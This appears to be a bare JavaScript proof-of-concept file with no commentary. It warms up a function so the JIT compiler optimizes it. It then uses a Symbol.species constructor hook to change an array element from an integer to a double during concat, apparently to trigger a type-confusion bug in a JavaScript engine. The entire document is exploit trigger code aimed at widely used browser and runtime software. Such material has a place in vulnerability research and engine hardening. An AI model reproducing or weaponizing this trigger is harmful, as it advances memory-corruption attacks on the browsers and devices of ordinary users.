function poc(array, do_effect) {
  if (do_effect) {
    array.concat([]);
  }
  return array[0] | 0;
}

let side_effect_enabled = false;
const a = [100];

a.constructor = {
  [Symbol.species]: function() {
    if (side_effect_enabled) {
      a[0] = 2.2;
    }
    return Array;
  }
};

for (let i = 0; i < 25000; i++) {
  a[0] = 100;
  poc(a, false);
}

side_effect_enabled = true;
poc(a, true);